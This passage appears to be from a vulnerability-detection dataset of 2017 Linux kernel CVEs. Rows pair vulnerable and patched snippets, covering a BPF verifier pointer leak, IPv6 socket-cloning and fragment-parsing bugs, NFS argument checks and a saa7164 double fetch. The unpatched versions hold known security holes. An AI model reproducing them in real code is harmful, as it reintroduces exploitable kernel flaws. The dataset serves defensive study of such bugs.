	skcipher->encrypt = alg->encrypt;
	skcipher->decrypt = alg->decrypt;
	skcipher->ivsize = alg->ivsize;
"
2017,#NAME?,CVE-2017-9150,"	[BPF_EXIT >> 4] = ""exit"",
};

static void print_bpf_insn(struct bpf_insn *insn)

{
	u8 class = BPF_CLASS(insn->code);

				insn->code,
				bpf_ldst_string[BPF_SIZE(insn->code) >> 3],
				insn->src_reg, insn->imm);
		} else if (BPF_MODE(insn->code) == BPF_IMM) {
 verbose(""(%02x) r%d = 0x%x\n"",
				insn->code, insn->dst_reg, insn->imm);










		} else {
 verbose(""BUG_ld_%02x\n"", insn->code);
 return;

 if (log_level) {
 verbose(""%d: "", insn_idx);
 print_bpf_insn(insn);
		}

		err = ext_analyzer_insn_hook(env, insn_idx, prev_insn_idx);
","	[BPF_EXIT >> 4] = ""exit"",
};

static void print_bpf_insn(const struct bpf_verifier_env *env,
 const struct bpf_insn *insn)
{
	u8 class = BPF_CLASS(insn->code);

				insn->code,
				bpf_ldst_string[BPF_SIZE(insn->code) >> 3],
				insn->src_reg, insn->imm);
		} else if (BPF_MODE(insn->code) == BPF_IMM &&
 BPF_SIZE(insn->code) == BPF_DW) {
 /* At this point, we already made sure that the second
			 * part of the ldimm64 insn is accessible.
 */
			u64 imm = ((u64)(insn + 1)->imm << 32) | (u32)insn->imm;
 bool map_ptr = insn->src_reg == BPF_PSEUDO_MAP_FD;

 if (map_ptr && !env->allow_ptr_leaks)
				imm = 0;

 verbose(""(%02x) r%d = 0x%llx\n"", insn->code,
				insn->dst_reg, (unsigned long long)imm);
		} else {
 verbose(""BUG_ld_%02x\n"", insn->code);
 return;

 if (log_level) {
 verbose(""%d: "", insn_idx);
 print_bpf_insn(env, insn);
		}

		err = ext_analyzer_insn_hook(env, insn_idx, prev_insn_idx);
"
2017,DoS ,CVE-2017-9077,"		newsk->sk_backlog_rcv = dccp_v4_do_rcv;
		newnp->pktoptions  = NULL;
		newnp->opt	   = NULL;



		newnp->mcast_oif   = inet6_iif(skb);
		newnp->mcast_hops  = ipv6_hdr(skb)->hop_limit;

 /* Clone RX bits */
	newnp->rxopt.all = np->rxopt.all;




	newnp->pktoptions = NULL;
	newnp->opt	  = NULL;
	newnp->mcast_oif  = inet6_iif(skb);
		newtp->af_specific = &tcp_sock_ipv6_mapped_specific;
#endif


		newnp->ipv6_ac_list = NULL;
		newnp->ipv6_fl_list = NULL;
		newnp->pktoptions  = NULL;
	   First: no IPv4 options.
 */
	newinet->inet_opt = NULL;

	newnp->ipv6_ac_list = NULL;
	newnp->ipv6_fl_list = NULL;

","		newsk->sk_backlog_rcv = dccp_v4_do_rcv;
		newnp->pktoptions  = NULL;
		newnp->opt	   = NULL;
		newnp->ipv6_mc_list = NULL;
		newnp->ipv6_ac_list = NULL;
		newnp->ipv6_fl_list = NULL;
		newnp->mcast_oif   = inet6_iif(skb);
		newnp->mcast_hops  = ipv6_hdr(skb)->hop_limit;

 /* Clone RX bits */
	newnp->rxopt.all = np->rxopt.all;

	newnp->ipv6_mc_list = NULL;
	newnp->ipv6_ac_list = NULL;
	newnp->ipv6_fl_list = NULL;
	newnp->pktoptions = NULL;
	newnp->opt	  = NULL;
	newnp->mcast_oif  = inet6_iif(skb);
		newtp->af_specific = &tcp_sock_ipv6_mapped_specific;
#endif

		newnp->ipv6_mc_list = NULL;
		newnp->ipv6_ac_list = NULL;
		newnp->ipv6_fl_list = NULL;
		newnp->pktoptions  = NULL;
	   First: no IPv4 options.
 */
	newinet->inet_opt = NULL;
	newnp->ipv6_mc_list = NULL;
	newnp->ipv6_ac_list = NULL;
	newnp->ipv6_fl_list = NULL;

"
2017,DoS ,CVE-2017-9076,"		newsk->sk_backlog_rcv = dccp_v4_do_rcv;
		newnp->pktoptions  = NULL;
		newnp->opt	   = NULL;



		newnp->mcast_oif   = inet6_iif(skb);
		newnp->mcast_hops  = ipv6_hdr(skb)->hop_limit;

 /* Clone RX bits */
	newnp->rxopt.all = np->rxopt.all;




	newnp->pktoptions = NULL;
	newnp->opt	  = NULL;
	newnp->mcast_oif  = inet6_iif(skb);
		newtp->af_specific = &tcp_sock_ipv6_mapped_specific;
#endif


		newnp->ipv6_ac_list = NULL;
		newnp->ipv6_fl_list = NULL;
		newnp->pktoptions  = NULL;
	   First: no IPv4 options.
 */
	newinet->inet_opt = NULL;

	newnp->ipv6_ac_list = NULL;
	newnp->ipv6_fl_list = NULL;

","		newsk->sk_backlog_rcv = dccp_v4_do_rcv;
		newnp->pktoptions  = NULL;
		newnp->opt	   = NULL;
		newnp->ipv6_mc_list = NULL;
		newnp->ipv6_ac_list = NULL;
		newnp->ipv6_fl_list = NULL;
		newnp->mcast_oif   = inet6_iif(skb);
		newnp->mcast_hops  = ipv6_hdr(skb)->hop_limit;

 /* Clone RX bits */
	newnp->rxopt.all = np->rxopt.all;

	newnp->ipv6_mc_list = NULL;
	newnp->ipv6_ac_list = NULL;
	newnp->ipv6_fl_list = NULL;
	newnp->pktoptions = NULL;
	newnp->opt	  = NULL;
	newnp->mcast_oif  = inet6_iif(skb);
		newtp->af_specific = &tcp_sock_ipv6_mapped_specific;
#endif

		newnp->ipv6_mc_list = NULL;
		newnp->ipv6_ac_list = NULL;
		newnp->ipv6_fl_list = NULL;
		newnp->pktoptions  = NULL;
	   First: no IPv4 options.
 */
	newinet->inet_opt = NULL;
	newnp->ipv6_mc_list = NULL;
	newnp->ipv6_ac_list = NULL;
	newnp->ipv6_fl_list = NULL;

"
2017,DoS ,CVE-2017-9075,"	newnp = inet6_sk(newsk);

 memcpy(newnp, np, sizeof(struct ipv6_pinfo));




 rcu_read_lock();
	opt = rcu_dereference(np->opt);
","	newnp = inet6_sk(newsk);

 memcpy(newnp, np, sizeof(struct ipv6_pinfo));
	newnp->ipv6_mc_list = NULL;
	newnp->ipv6_ac_list = NULL;
	newnp->ipv6_fl_list = NULL;

 rcu_read_lock();
	opt = rcu_dereference(np->opt);
"
2017,DoS ,CVE-2017-9074,"
 if (udpfrag) {
			unfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);


			fptr = (struct frag_hdr *)((u8 *)ipv6h + unfrag_ip6hlen);
			fptr->frag_off = htons(offset);
 if (skb->next)
	u8 *prevhdr, nexthdr = 0;

	hlen = ip6_find_1stfragopt(skb, &prevhdr);




	nexthdr = *prevhdr;

	mtu = ip6_skb_dst_mtu(skb);
int ip6_find_1stfragopt(struct sk_buff *skb, u8 **nexthdr)
{
	u16 offset = sizeof(struct ipv6hdr);
 struct ipv6_opt_hdr *exthdr =
				(struct ipv6_opt_hdr *)(ipv6_hdr(skb) + 1);
 unsigned int packet_len = skb_tail_pointer(skb) -
 skb_network_header(skb);
 int found_rhdr = 0;
	*nexthdr = &ipv6_hdr(skb)->nexthdr;

 while (offset + 1 <= packet_len) {


 switch (**nexthdr) {

 return offset;
		}

		offset += ipv6_optlen(exthdr);
		*nexthdr = &exthdr->nexthdr;

		exthdr = (struct ipv6_opt_hdr *)(skb_network_header(skb) +
						 offset);


	}

 return offset;
}
EXPORT_SYMBOL(ip6_find_1stfragopt);

		 * bytes to insert fragment header.
 */
		unfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);


		nexthdr = *prevhdr;
		*prevhdr = NEXTHDR_FRAGMENT;
		unfrag_len = (skb_network_header(skb) - skb_mac_header(skb)) +
","
 if (udpfrag) {
			unfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);
 if (unfrag_ip6hlen < 0)
 return ERR_PTR(unfrag_ip6hlen);
			fptr = (struct frag_hdr *)((u8 *)ipv6h + unfrag_ip6hlen);
			fptr->frag_off = htons(offset);
 if (skb->next)
	u8 *prevhdr, nexthdr = 0;

	hlen = ip6_find_1stfragopt(skb, &prevhdr);
 if (hlen < 0) {
		err = hlen;
 goto fail;
	}
	nexthdr = *prevhdr;

	mtu = ip6_skb_dst_mtu(skb);
int ip6_find_1stfragopt(struct sk_buff *skb, u8 **nexthdr)
{
	u16 offset = sizeof(struct ipv6hdr);


 unsigned int packet_len = skb_tail_pointer(skb) -
 skb_network_header(skb);
 int found_rhdr = 0;
	*nexthdr = &ipv6_hdr(skb)->nexthdr;

 while (offset <= packet_len) {
 struct ipv6_opt_hdr *exthdr;

 switch (**nexthdr) {

 return offset;
		}

 if (offset + sizeof(struct ipv6_opt_hdr) > packet_len)
 return -EINVAL;

		exthdr = (struct ipv6_opt_hdr *)(skb_network_header(skb) +
						 offset);
		offset += ipv6_optlen(exthdr);
		*nexthdr = &exthdr->nexthdr;
	}

 return -EINVAL;
}
EXPORT_SYMBOL(ip6_find_1stfragopt);

		 * bytes to insert fragment header.
 */
		unfrag_ip6hlen = ip6_find_1stfragopt(skb, &prevhdr);
 if (unfrag_ip6hlen < 0)
 return ERR_PTR(unfrag_ip6hlen);
		nexthdr = *prevhdr;
		*prevhdr = NEXTHDR_FRAGMENT;
		unfrag_len = (skb_network_header(skb) - skb_mac_header(skb)) +
"
2017,DoS ,CVE-2017-9059,"{
 int		err = 0;
 struct svc_rqst *rqstp = vrqstp;



 /* try_to_freeze() is called from svc_recv() */
 set_freezable();
 if (nlmsvc_ops)
 nlmsvc_invalidate_all();
 nlm_shutdown_hosts();


 return 0;
}

 if (ln->nlmsvc_users) {
 if (--ln->nlmsvc_users == 0) {
 nlm_shutdown_hosts_net(net);
 cancel_delayed_work_sync(&ln->grace_period_end);
 locks_end_grace(&ln->lockd_manager);
 svc_shutdown_net(serv, net);
 dprintk(""lockd_down_net: per-net data destroyed; net=%p\n"", net);
		}
 if (!(block = nlmsvc_find_block(cookie)))
 return;

 if (block) {
 if (status == nlm_lck_denied_grace_period) {
  /* Try again in a couple of seconds */
  nlmsvc_insert_block(block, 10 * HZ);
 } else {
  /* Lock is now held by client, or has been rejected.
   * In both cases, the block should be removed. */
  nlmsvc_unlink_block(block);
 }
	}
 nlmsvc_release_block(block);
}

 set_freezable();

 while (!kthread_should_stop()) {



 /*
		 * Listen for a request on the socket
 */
 continue;
 svc_process(rqstp);
	}


 return 0;
}


 set_freezable();

 while (!kthread_should_stop()) {
 if (try_to_freeze())
 continue;


 prepare_to_wait(&serv->sv_cb_waitq, &wq, TASK_INTERRUPTIBLE);
 spin_lock_bh(&serv->sv_cb_lock);
				error);
		} else {
 spin_unlock_bh(&serv->sv_cb_lock);
 schedule();

 finish_wait(&serv->sv_cb_waitq, &wq);
		}
 flush_signals(current);
	}


 return 0;
}

static struct svc_serv_ops nfs40_cb_sv_ops = {
	.svo_function		= nfs4_callback_svc,
	.svo_enqueue_xprt	= svc_xprt_do_enqueue,
	.svo_setup		= svc_set_num_threads,
	.svo_module		= THIS_MODULE,
};
#if defined(CONFIG_NFS_V4_1)
static struct svc_serv_ops nfs41_cb_sv_ops = {
	.svo_function		= nfs41_callback_svc,
	.svo_enqueue_xprt	= svc_xprt_do_enqueue,
	.svo_setup		= svc_set_num_threads,
	.svo_module		= THIS_MODULE,
};

 printk(KERN_WARNING ""nfs_callback_create_svc: no kthread, %d users??\n"",
			cb_info->users);

	serv = svc_create(&nfs4_callback_program, NFS4_CALLBACK_BUFSIZE, sv_ops);
 if (!serv) {
 printk(KERN_ERR ""nfs_callback_create_svc: create service failed\n"");
 return ERR_PTR(-ENOMEM);
 if (!p)
 return 0;
	p = xdr_decode_hyper(p, &args->offset);

	args->count = ntohl(*p++);




	len = min(args->count, max_blocksize);

 /* set up the kvec */
		v++;
	}
	args->vlen = v;
 return xdr_argsize_check(rqstp, p);
}

int
	p = decode_fh(p, &args->fh);
 if (!p)
 return 0;


	args->buffer = page_address(*(rqstp->rq_next_page++));

 return xdr_argsize_check(rqstp, p);
}

int
	args->verf   = p; p += 2;
	args->dircount = ~0;
	args->count  = ntohl(*p++);




	args->count  = min_t(u32, args->count, PAGE_SIZE);
	args->buffer = page_address(*(rqstp->rq_next_page++));

 return xdr_argsize_check(rqstp, p);
}

int
	args->dircount = ntohl(*p++);
	args->count    = ntohl(*p++);




	len = args->count = min(args->count, max_blocksize);
 while (len > 0) {
 struct page *p = *(rqstp->rq_next_page++);
 if (!args->buffer)
			args->buffer = page_address(p);
		len -= PAGE_SIZE;
	}

 return xdr_argsize_check(rqstp, p);
}

int
 return NULL;
	}

 if (!(exp->ex_layout_types & (1 << layout_type))) {

 dprintk(""%s: layout type %d not supported\n"",
			__func__, layout_type);
 return NULL;
	target->cl_clientid.cl_id = source->cl_clientid.cl_id; 
}

int strdup_if_nonnull(char **target, char *source)
{
 if (source) {
		*target = kstrdup(source, GFP_KERNEL);
 if (!*target)
 return -ENOMEM;
	} else
		*target = NULL;
 return 0;
}

static int copy_cred(struct svc_cred *target, struct svc_cred *source)
{
 int ret;






	ret = strdup_if_nonnull(&target->cr_principal, source->cr_principal);
 if (ret)
 return ret;
	ret = strdup_if_nonnull(&target->cr_raw_principal,
					source->cr_raw_principal);
 if (ret)
 return ret;
	target->cr_flavor = source->cr_flavor;
	target->cr_uid = source->cr_uid;
	target->cr_gid = source->cr_gid;
	}
#endif /* CONFIG_NFSD_PNFS */
 if (bmval2 & FATTR4_WORD2_SUPPATTR_EXCLCREAT) {
		status = nfsd4_encode_bitmap(xdr, NFSD_SUPPATTR_EXCLCREAT_WORD0,
						  NFSD_SUPPATTR_EXCLCREAT_WORD1,
						  NFSD_SUPPATTR_EXCLCREAT_WORD2);





 if (status)
 goto out;
	}
 struct nfsd4_getdeviceinfo *gdev)
{
 struct xdr_stream *xdr = &resp->xdr;
 const struct nfsd4_layout_ops *ops =
		nfsd4_layout_ops[gdev->gd_layout_type];
	u32 starting_len = xdr->buf->len, needed_len;
	__be32 *p;


 /* If maxcount is 0 then just update notifications */
 if (gdev->gd_maxcount != 0) {

		nfserr = ops->encode_getdeviceinfo(xdr, gdev);
 if (nfserr) {
 /*
 struct nfsd4_layoutget *lgp)
{
 struct xdr_stream *xdr = &resp->xdr;
 const struct nfsd4_layout_ops *ops =
		nfsd4_layout_ops[lgp->lg_layout_type];
	__be32 *p;

 dprintk(""%s: err %d\n"", __func__, nfserr);
	*p++ = cpu_to_be32(lgp->lg_seg.iomode);
	*p++ = cpu_to_be32(lgp->lg_layout_type);


	nfserr = ops->encode_layoutget(xdr, lgp);
out:
 kfree(lgp->lg_content);
	len = args->count     = ntohl(*p++);
	p++; /* totalcount - unused */




	len = min_t(unsigned int, len, NFSSVC_MAXBLKSIZE_V2);

 /* set up somewhere to store response.
		v++;
	}
	args->vlen = v;
 return xdr_argsize_check(rqstp, p);
}

int
	p = decode_fh(p, &args->fh);
 if (!p)
 return 0;


	args->buffer = page_address(*(rqstp->rq_next_page++));

 return xdr_argsize_check(rqstp, p);
}

int
	args->cookie = ntohl(*p++);
	args->count  = ntohl(*p++);
	args->count  = min_t(u32, args->count, PAGE_SIZE);


	args->buffer = page_address(*(rqstp->rq_next_page++));

 return xdr_argsize_check(rqstp, p);
}

/*
	err = follow_down(&path);
 if (err < 0)
 goto out;







 exp2 = rqst_exp_get_by_name(rqstp, &path);
 if (IS_ERR(exp2)) {
/*
 * For nfsd purposes, we treat V4ROOT exports as though there was an
 * export at *every* directory.




 */
int nfsd_mountpoint(struct dentry *dentry, struct svc_export *exp)
{
 if (d_mountpoint(dentry))


 return 1;
 if (nfsd4_is_junction(dentry))
 return 1;
 if (!(exp->ex_flags & NFSEXP_V4ROOT))
 return 0;
 return d_inode(dentry) != NULL;




}

__be32
#define rdma_done cpu_to_be32(RDMA_DONE)
#define rdma_error cpu_to_be32(RDMA_ERROR)




/*
 * Private extension to RPC-over-RDMA Version One.
 * Message passed during RDMA-CM connection set-up.
","{
 int		err = 0;
 struct svc_rqst *rqstp = vrqstp;
 struct net *net = &init_net;
 struct lockd_net *ln = net_generic(net, lockd_net_id);

 /* try_to_freeze() is called from svc_recv() */
 set_freezable();
 if (nlmsvc_ops)
 nlmsvc_invalidate_all();
 nlm_shutdown_hosts();
 cancel_delayed_work_sync(&ln->grace_period_end);
 locks_end_grace(&ln->lockd_manager);
 return 0;
}

 if (ln->nlmsvc_users) {
 if (--ln->nlmsvc_users == 0) {
 nlm_shutdown_hosts_net(net);


 svc_shutdown_net(serv, net);
 dprintk(""lockd_down_net: per-net data destroyed; net=%p\n"", net);
		}
 if (!(block = nlmsvc_find_block(cookie)))
 return;

 if (status == nlm_lck_denied_grace_period) {
 /* Try again in a couple of seconds */
 nlmsvc_insert_block(block, 10 * HZ);
 } else {
 /*
  * Lock is now held by client, or has been rejected.
		 * In both cases, the block should be removed.
  */
 nlmsvc_unlink_block(block);
	}
 nlmsvc_release_block(block);
}

 set_freezable();

 while (!kthread_freezable_should_stop(NULL)) {

 if (signal_pending(current))
 flush_signals(current);
 /*
		 * Listen for a request on the socket
 */
 continue;
 svc_process(rqstp);
	}
 svc_exit_thread(rqstp);
 module_put_and_exit(0);
 return 0;
}


 set_freezable();

 while (!kthread_freezable_should_stop(NULL)) {

 if (signal_pending(current))
 flush_signals(current);

 prepare_to_wait(&serv->sv_cb_waitq, &wq, TASK_INTERRUPTIBLE);
 spin_lock_bh(&serv->sv_cb_lock);
				error);
		} else {
 spin_unlock_bh(&serv->sv_cb_lock);
 if (!kthread_should_stop())
 schedule();
 finish_wait(&serv->sv_cb_waitq, &wq);
		}

	}
 svc_exit_thread(rqstp);
 module_put_and_exit(0);
 return 0;
}

static struct svc_serv_ops nfs40_cb_sv_ops = {
	.svo_function		= nfs4_callback_svc,
	.svo_enqueue_xprt	= svc_xprt_do_enqueue,
	.svo_setup		= svc_set_num_threads_sync,
	.svo_module		= THIS_MODULE,
};
#if defined(CONFIG_NFS_V4_1)
static struct svc_serv_ops nfs41_cb_sv_ops = {
	.svo_function		= nfs41_callback_svc,
	.svo_enqueue_xprt	= svc_xprt_do_enqueue,
	.svo_setup		= svc_set_num_threads_sync,
	.svo_module		= THIS_MODULE,
};

 printk(KERN_WARNING ""nfs_callback_create_svc: no kthread, %d users??\n"",
			cb_info->users);

	serv = svc_create_pooled(&nfs4_callback_program, NFS4_CALLBACK_BUFSIZE, sv_ops);
 if (!serv) {
 printk(KERN_ERR ""nfs_callback_create_svc: create service failed\n"");
 return ERR_PTR(-ENOMEM);
 if (!p)
 return 0;
	p = xdr_decode_hyper(p, &args->offset);

	args->count = ntohl(*p++);

 if (!xdr_argsize_check(rqstp, p))
 return 0;

	len = min(args->count, max_blocksize);

 /* set up the kvec */
		v++;
	}
	args->vlen = v;
 return 1;
}

int
	p = decode_fh(p, &args->fh);
 if (!p)
 return 0;
 if (!xdr_argsize_check(rqstp, p))
 return 0;
	args->buffer = page_address(*(rqstp->rq_next_page++));

 return 1;
}

int
	args->verf   = p; p += 2;
	args->dircount = ~0;
	args->count  = ntohl(*p++);

 if (!xdr_argsize_check(rqstp, p))
 return 0;

	args->count  = min_t(u32, args->count, PAGE_SIZE);
	args->buffer = page_address(*(rqstp->rq_next_page++));

 return 1;
}

int
	args->dircount = ntohl(*p++);
	args->count    = ntohl(*p++);

 if (!xdr_argsize_check(rqstp, p))
 return 0;

	len = args->count = min(args->count, max_blocksize);
 while (len > 0) {
 struct page *p = *(rqstp->rq_next_page++);
 if (!args->buffer)
			args->buffer = page_address(p);
		len -= PAGE_SIZE;
	}
 return 1;

}

int
 return NULL;
	}

 if (layout_type >= LAYOUT_TYPE_MAX ||
	    !(exp->ex_layout_types & (1 << layout_type))) {
 dprintk(""%s: layout type %d not supported\n"",
			__func__, layout_type);
 return NULL;
	target->cl_clientid.cl_id = source->cl_clientid.cl_id; 
}












static int copy_cred(struct svc_cred *target, struct svc_cred *source)
{
	target->cr_principal = kstrdup(source->cr_principal, GFP_KERNEL);
	target->cr_raw_principal = kstrdup(source->cr_raw_principal,
								GFP_KERNEL);
 if ((source->cr_principal && ! target->cr_principal) ||
	    (source->cr_raw_principal && ! target->cr_raw_principal))
 return -ENOMEM;








	target->cr_flavor = source->cr_flavor;
	target->cr_uid = source->cr_uid;
	target->cr_gid = source->cr_gid;
	}
#endif /* CONFIG_NFSD_PNFS */
 if (bmval2 & FATTR4_WORD2_SUPPATTR_EXCLCREAT) {
		u32 supp[3];

 memcpy(supp, nfsd_suppattrs[minorversion], sizeof(supp));
		supp[0] &= NFSD_SUPPATTR_EXCLCREAT_WORD0;
		supp[1] &= NFSD_SUPPATTR_EXCLCREAT_WORD1;
		supp[2] &= NFSD_SUPPATTR_EXCLCREAT_WORD2;

		status = nfsd4_encode_bitmap(xdr, supp[0], supp[1], supp[2]);
 if (status)
 goto out;
	}
 struct nfsd4_getdeviceinfo *gdev)
{
 struct xdr_stream *xdr = &resp->xdr;
 const struct nfsd4_layout_ops *ops;

	u32 starting_len = xdr->buf->len, needed_len;
	__be32 *p;


 /* If maxcount is 0 then just update notifications */
 if (gdev->gd_maxcount != 0) {
		ops = nfsd4_layout_ops[gdev->gd_layout_type];
		nfserr = ops->encode_getdeviceinfo(xdr, gdev);
 if (nfserr) {
 /*
 struct nfsd4_layoutget *lgp)
{
 struct xdr_stream *xdr = &resp->xdr;
 const struct nfsd4_layout_ops *ops;

	__be32 *p;

 dprintk(""%s: err %d\n"", __func__, nfserr);
	*p++ = cpu_to_be32(lgp->lg_seg.iomode);
	*p++ = cpu_to_be32(lgp->lg_layout_type);

	ops = nfsd4_layout_ops[lgp->lg_layout_type];
	nfserr = ops->encode_layoutget(xdr, lgp);
out:
 kfree(lgp->lg_content);
	len = args->count     = ntohl(*p++);
	p++; /* totalcount - unused */

 if (!xdr_argsize_check(rqstp, p))
 return 0;

	len = min_t(unsigned int, len, NFSSVC_MAXBLKSIZE_V2);

 /* set up somewhere to store response.
		v++;
	}
	args->vlen = v;
 return 1;
}

int
	p = decode_fh(p, &args->fh);
 if (!p)
 return 0;
 if (!xdr_argsize_check(rqstp, p))
 return 0;
	args->buffer = page_address(*(rqstp->rq_next_page++));

 return 1;
}

int
	args->cookie = ntohl(*p++);
	args->count  = ntohl(*p++);
	args->count  = min_t(u32, args->count, PAGE_SIZE);
 if (!xdr_argsize_check(rqstp, p))
 return 0;
	args->buffer = page_address(*(rqstp->rq_next_page++));

 return 1;
}

/*
	err = follow_down(&path);
 if (err < 0)
 goto out;
 if (path.mnt == exp->ex_path.mnt && path.dentry == dentry &&
 nfsd_mountpoint(dentry, exp) == 2) {
 /* This is only a mountpoint in some other namespace */
 path_put(&path);
 goto out;
	}

 exp2 = rqst_exp_get_by_name(rqstp, &path);
 if (IS_ERR(exp2)) {
/*
 * For nfsd purposes, we treat V4ROOT exports as though there was an
 * export at *every* directory.
 * We return:
 * '1' if this dentry *must* be an export point,
 * '2' if it might be, if there is really a mount here, and
 * '0' if there is no chance of an export point here.
 */
int nfsd_mountpoint(struct dentry *dentry, struct svc_export *exp)
{
 if (!d_inode(dentry))
 return 0;
 if (exp->ex_flags & NFSEXP_V4ROOT)
 return 1;
 if (nfsd4_is_junction(dentry))
 return 1;
 if (d_mountpoint(dentry))
 /*
		 * Might only be a mountpoint in a different namespace,
		 * but we need to check.
 */
 return 2;
 return 0;
}

__be32
#define rdma_done cpu_to_be32(RDMA_DONE)
#define rdma_error cpu_to_be32(RDMA_ERROR)

#define err_vers cpu_to_be32(ERR_VERS)
#define err_chunk cpu_to_be32(ERR_CHUNK)

/*
 * Private extension to RPC-over-RDMA Version One.
 * Message passed during RDMA-CM connection set-up.
"
2017,DoS ,CVE-2017-8925,"
static int omninet_open(struct tty_struct *tty, struct usb_serial_port *port)
{
 struct usb_serial	*serial = port->serial;
 struct usb_serial_port	*wport;

	wport = serial->port[1];
 tty_port_tty_set(&wport->port, tty);

 return usb_serial_generic_open(tty, port);
}

","
static int omninet_open(struct tty_struct *tty, struct usb_serial_port *port)
{






 return usb_serial_generic_open(tty, port);
}

"
2017,#NAME?,CVE-2017-8924,"
	port_number = edge_port->port->port_number;

 if (edge_port->lsr_event) {
		edge_port->lsr_event = 0;
 dev_dbg(dev, ""%s ===== Port %u LSR Status = %02x, Data = %02x ======\n"",
			__func__, port_number, edge_port->lsr_mask, *data);
","
	port_number = edge_port->port->port_number;

 if (urb->actual_length > 0 && edge_port->lsr_event) {
		edge_port->lsr_event = 0;
 dev_dbg(dev, ""%s ===== Port %u LSR Status = %02x, Data = %02x ======\n"",
			__func__, port_number, edge_port->lsr_mask, *data);
"
2017,DoS ,CVE-2017-8890," /* listeners have SOCK_RCU_FREE, not the children */
 sock_reset_flag(newsk, SOCK_RCU_FREE);



		newsk->sk_mark = inet_rsk(req)->ir_mark;
 atomic64_set(&newsk->sk_cookie,
 atomic64_read(&inet_rsk(req)->ir_cookie));
"," /* listeners have SOCK_RCU_FREE, not the children */
 sock_reset_flag(newsk, SOCK_RCU_FREE);

 inet_sk(newsk)->mc_list = NULL;

		newsk->sk_mark = inet_rsk(req)->ir_mark;
 atomic64_set(&newsk->sk_cookie,
 atomic64_read(&inet_rsk(req)->ir_cookie));
"
2017,DoS ,CVE-2017-8831,"	msg_tmp.size = le16_to_cpu((__force __le16)msg_tmp.size);
	msg_tmp.command = le32_to_cpu((__force __le32)msg_tmp.command);
	msg_tmp.controlselector = le16_to_cpu((__force __le16)msg_tmp.controlselector);


 /* No need to update the read positions, because this was a peek */
 /* If the caller specifically want to peek, return */
 if (peekonly) {
 memcpy(msg, &msg_tmp, sizeof(*msg));
 goto peekout;
	}

		space_rem = bus->m_dwSizeGetRing - curr_grp;

 if (space_rem < sizeof(*msg)) {
 /* msg wraps around the ring */
 memcpy_fromio(msg, bus->m_pdwGetRing + curr_grp, space_rem);
 memcpy_fromio((u8 *)msg + space_rem, bus->m_pdwGetRing,
 sizeof(*msg) - space_rem);
 if (buf)
 memcpy_fromio(buf, bus->m_pdwGetRing + sizeof(*msg) -
					space_rem, buf_size);

		} else if (space_rem == sizeof(*msg)) {
 memcpy_fromio(msg, bus->m_pdwGetRing + curr_grp, sizeof(*msg));
 if (buf)
 memcpy_fromio(buf, bus->m_pdwGetRing, buf_size);
		} else {
 /* Additional data wraps around the ring */
 memcpy_fromio(msg, bus->m_pdwGetRing + curr_grp, sizeof(*msg));
 if (buf) {
 memcpy_fromio(buf, bus->m_pdwGetRing + curr_grp +
 sizeof(*msg), space_rem - sizeof(*msg));

	} else {
 /* No wrapping */
 memcpy_fromio(msg, bus->m_pdwGetRing + curr_grp, sizeof(*msg));
 if (buf)
 memcpy_fromio(buf, bus->m_pdwGetRing + curr_grp + sizeof(*msg),
				buf_size);
	}
 /* Convert from little endian to CPU */
	msg->size = le16_to_cpu((__force __le16)msg->size);
	msg->command = le32_to_cpu((__force __le32)msg->command);
	msg->controlselector = le16_to_cpu((__force __le16)msg->controlselector);

 /* Update the read positions, adjusting the ring */
 saa7164_writel(bus->m_dwGetReadPos, new_grp);
","	msg_tmp.size = le16_to_cpu((__force __le16)msg_tmp.size);
	msg_tmp.command = le32_to_cpu((__force __le32)msg_tmp.command);
	msg_tmp.controlselector = le16_to_cpu((__force __le16)msg_tmp.controlselector);
 memcpy(msg, &msg_tmp, sizeof(*msg));

 /* No need to update the read positions, because this was a peek */
 /* If the caller specifically want to peek, return */
 if (peekonly) {

 goto peekout;
	}

		space_rem = bus->m_dwSizeGetRing - curr_grp;

 if (space_rem < sizeof(*msg)) {




 if (buf)
 memcpy_fromio(buf, bus->m_pdwGetRing + sizeof(*msg) -
					space_rem, buf_size);

		} else if (space_rem == sizeof(*msg)) {

 if (buf)
 memcpy_fromio(buf, bus->m_pdwGetRing, buf_size);
		} else {
 /* Additional data wraps around the ring */

 if (buf) {
 memcpy_fromio(buf, bus->m_pdwGetRing + curr_grp +
 sizeof(*msg), space_rem - sizeof(*msg));

	} else {
 /* No wrapping */

 if (buf)
 memcpy_fromio(buf, bus->m_pdwGetRing + curr_grp + sizeof(*msg),
				buf_size);
	}





 /* Update the read positions, adjusting the ring */
 saa7164_writel(bus->m_dwGetReadPos, new_grp);
"
2017,DoS +Priv ,CVE-2017-8824,,
2017,,CVE-2017-8797," struct nfsd4_getdeviceinfo *gdev)
{
 struct xdr_stream *xdr = &resp->xdr;
 const struct nfsd4_layout_ops *ops =
		nfsd4_layout_ops[gdev->gd_layout_type];
	u32 starting_len = xdr->buf->len, needed_len;
	__be32 *p;


 /* If maxcount is 0 then just update notifications */
 if (gdev->gd_maxcount != 0) {

		nfserr = ops->encode_getdeviceinfo(xdr, gdev);
 if (nfserr) {
 /*
 struct nfsd4_layoutget *lgp)
{
 struct xdr_stream *xdr = &resp->xdr;
 const struct nfsd4_layout_ops *ops =
		nfsd4_layout_ops[lgp->lg_layout_type];
	__be32 *p;

 dprintk(""%s: err %d\n"", __func__, nfserr);
	*p++ = cpu_to_be32(lgp->lg_seg.iomode);
	*p++ = cpu_to_be32(lgp->lg_layout_type);


	nfserr = ops->encode_layoutget(xdr, lgp);
out:
 kfree(lgp->lg_content);
"," struct nfsd4_getdeviceinfo *gdev)
{
 struct xdr_stream *xdr = &resp->xdr;
 const struct nfsd4_layout_ops *ops;

	u32 starting_len = xdr->buf->len, needed_len;
	__be32 *p;


 /* If maxcount is 0 then just update notifications */
 if (gdev->gd_maxcount != 0) {
		ops = nfsd4_layout_ops[gdev->gd_layout_type];
		nfserr = ops->encode_getdeviceinfo(xdr, gdev);
 if (nfserr) {
 /*
 struct nfsd4_layoutget *lgp)
{
 struct xdr_stream *xdr = &resp->xdr;
 const struct nfsd4_layout_ops *ops;

	__be32 *p;

 dprintk(""%s: err %d\n"", __func__, nfserr);
	*p++ = cpu_to_be32(lgp->lg_seg.iomode);
	*p++ = cpu_to_be32(lgp->lg_layout_type);

	ops = nfsd4_layout_ops[lgp->lg_layout_type];
	nfserr = ops->encode_layoutget(xdr, lgp);
out:
 kfree(lgp->lg_content);
"
2017,DoS ,CVE-2017-8106,,
2017,,CVE-2017-8072,"
exit:
 mutex_unlock(&dev->lock);
